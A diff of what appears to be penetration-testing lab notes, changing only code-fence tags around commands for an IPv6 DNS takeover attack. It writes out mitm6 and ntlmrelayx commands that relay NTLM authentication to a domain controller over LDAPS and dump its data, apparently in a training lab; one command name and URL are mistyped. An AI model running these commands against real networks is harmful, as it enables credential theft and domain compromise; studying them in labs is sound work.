@@ -10,19 +10,19 @@ All of this can be done with a tool called MITM6(man in the Middle 6)
 
 It should be installed by default in your Kali machine but if not, you can install it by going to /opt/mitm6 and running this command
 
-```
+```bash
 sudo pip2 install .
 ```
 
 Once mitm6 is downloaded, you can run it by: (but we wont run it yet, we first have to set up an ntlm relay) 
 
-```
+```bash
 sudo mitm6 -d <domain_name>
 ```
 
 To set up an NTLM relay with this method, you can use th following command:
 
-```
+```bash
 ntlmrealyx.py -6 -t ldaps:/<ip_of_domain_controller> -wh fakewpad.marvel -l lootme
 ```
 
